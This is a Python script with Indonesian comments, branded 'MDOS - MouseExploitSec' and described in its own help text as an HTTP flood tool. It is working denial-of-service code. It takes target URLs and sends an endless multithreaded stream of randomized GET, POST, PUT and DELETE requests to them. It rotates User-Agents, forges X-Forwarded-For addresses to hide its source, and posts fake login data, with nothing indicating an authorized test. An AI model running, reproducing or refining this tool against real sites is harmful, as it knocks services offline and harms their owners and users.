import requests
import random
import time
import logging
import sys
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import argparse

init(autoreset=True)

# Konfigurasi logging
logging.basicConfig(
    filename="http_flood.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

RANDOM_PATHS = [
    "/", "/about", "/contact", "/products", "/services", "/login", "/search", "/checkout"
]

def generate_random_payload():
    """Menghasilkan payload acak untuk POST/PUT requests."""
    payload = {
        "username": "user" + str(random.randint(1, 1000)),
        "password": "pass" + str(random.randint(1, 1000)),
        "email": f"user{random.randint(1, 1000)}@example.com",
        "timestamp": int(time.time())
    }
    return payload

def generate_random_headers():
    """Menghasilkan headers acak untuk setiap request."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/",
        "Cache-Control": "no-cache",
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }
    return headers

def format_url(url):
    """Memformat URL dengan menambahkan scheme jika diperlukan."""
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url.rstrip("/")

def send_request(target_url, retries=3):
    """Mengirim request ke target URL."""
    try:
        headers = generate_random_headers()
        path = random.choice(RANDOM_PATHS)
        url = target_url + path
        random_query = f"?id={random.randint(1, 100000)}&ref={random.randint(1, 1000)}"
        url += random_query
        method = random.choice(["GET", "POST", "PUT", "DELETE"])

        with requests.Session() as session:
            for attempt in range(retries):
                try:
                    if method == "GET":
                        response = session.get(url, headers=headers, timeout=10, verify=True)
                    elif method == "POST":
                        payload = generate_random_payload()
                        response = session.post(url, headers=headers, json=payload, timeout=10, verify=True)
                    elif method == "PUT":
                        payload = generate_random_payload()
                        response = session.put(url, headers=headers, json=payload, timeout=10, verify=True)
                    elif method == "DELETE":
                        response = session.delete(url, headers=headers, timeout=10, verify=True)

                    status_message = "OK" if response.status_code == 200 else "Not Found"
                    print(Fore.WHITE + f"[+] Method: {method} | Path: {path}{random_query} | Status: {response.status_code} ({status_message})")
                    break  # Berhasil, keluar dari loop retry
                except requests.exceptions.RequestException as e:
                    if attempt == retries - 1:
                        print(Fore.RED + f"[-] Error: {e} after {retries} retries")
                    else:
                        time.sleep(1)  # Tunggu 1 detik sebelum retry
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {e}")

def http_attack(target_urls, thread_count, request_rate):
    """Melakukan serangan HTTP flood ke target URL."""
    if not target_urls:
        print(Fore.RED + "[-] Error: Tidak ada URL target yang diberikan.")
        sys.exit(1)

    start_time = time.time()
    request_count = 0

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        try:
            while True:
                for target_url in target_urls:
                    print(Fore.CYAN + f"\n[+] Target: {target_url}")
                    for _ in range(thread_count // len(target_urls)):
                        executor.submit(send_request, target_url)
                        request_count += 1

                # Menampilkan statistik real-time
                elapsed_time = time.time() - start_time
                print(Fore.CYAN + f"[+] Statistik: Total Requests: {request_count} | Requests/s: {request_count / elapsed_time:.2f}")
                time.sleep(1 / request_rate)  # Kontrol kecepatan request

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Serangan dihentikan oleh pengguna.")

if __name__ == "__main__":
    print(Fore.CYAN + r'''
   *    (        )  (     
 (  `   )\ )  ( /(  )\ )  
 )\))( (()/(  )\())(()/(  
((_)()\ /(_))((_)\  /(_)) 
(_()((_|_))_   ((_)(_))   
|  \/  ||   \ / _ \/ __|  
| |\/| || |) | (_) \__ \  
|_|  |_||___/ \___/|___/  
>> MDOS - MouseExploitSec 
    ''')

    parser = argparse.ArgumentParser(description="Alat HTTP Flood Canggih dengan Fitur Tambahan")
    parser.add_argument("target_urls", type=str, nargs="+", help="URL target yang akan diserang (bisa lebih dari satu)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Jumlah thread yang digunakan")
    parser.add_argument("-r", "--rate", type=int, default=10, help="Kecepatan request per detik (request rate)")
    args = parser.parse_args()

    target_urls = [format_url(url) for url in args.target_urls]
    thread_count = args.threads
    request_rate = args.rate

    try:
        http_attack(target_urls, thread_count, request_rate)
    except Exception as e:
        print(Fore.RED + f"[-] Terjadi kesalahan: {e}")
